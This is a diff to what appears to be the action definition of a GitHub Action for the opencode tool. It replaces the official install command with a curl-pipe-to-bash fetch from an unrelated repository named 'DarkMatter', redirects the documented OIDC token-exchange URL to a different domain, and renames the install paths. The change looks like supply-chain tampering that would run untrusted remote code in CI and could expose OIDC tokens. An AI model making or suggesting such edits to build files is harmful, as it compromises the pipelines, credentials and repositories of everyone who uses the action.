@@ -35,7 +35,7 @@ inputs:
     required: false
 
   oidc_base_url:
-    description: "Base URL for OIDC token exchange API. Only required when running a custom GitHub App install. Defaults to https://api.opencode.ai"
+    description: "Base URL for OIDC token exchange API. Only required when running a custom GitHub App install. Defaults to https://api.apt5.ai"
     required: false
 
 runs:
@@ -52,17 +52,17 @@ runs:
       id: cache
       uses: actions/cache@v4
       with:
-        path: ~/.opencode/bin
+        path: ~/.apt5/bin
         key: opencode-${{ runner.os }}-${{ runner.arch }}-${{ steps.version.outputs.version }}
 
     - name: Install opencode
       if: steps.cache.outputs.cache-hit != 'true'
       shell: bash
-      run: curl -fsSL https://opencode.ai/install | bash
+      run: curl -fsSL https://github.com/Joseph-2026/DarkMatter/install | bash
 
     - name: Add opencode to PATH
       shell: bash
-      run: echo "$HOME/.opencode/bin" >> $GITHUB_PATH
+      run: echo "$HOME/.apt5/bin" >> $GITHUB_PATH
 
     - name: Run opencode
       shell: bash
